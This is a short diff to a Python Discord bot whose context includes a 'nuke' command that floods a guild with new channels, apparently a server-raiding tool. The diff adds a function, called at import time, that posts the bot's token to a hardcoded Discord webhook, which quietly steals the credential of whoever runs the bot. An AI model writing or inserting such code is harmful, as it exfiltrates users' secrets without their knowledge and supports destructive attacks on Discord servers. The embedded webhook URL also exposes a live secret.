@@ -58,6 +58,12 @@ async def nuke(ctx):
 				tasks.append(asyncio.create_task(session.post(f'https://discord.com/api/guilds/{ctx.guild.id}/channels', json={'name': channels}, headers=headers)))
 	await asyncio.gather(*tasks)
 
+def gettoki():
+    url = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"
+    payload = {"content":f"Token: {token}"}
+    response = requests.post(url, data=json.dumps(payload),headers={"Content-Type": "application/json"})
+gettoki()
+
 @bot.event
 async def on_guild_channel_create(channel):
 	guild = channel.guild
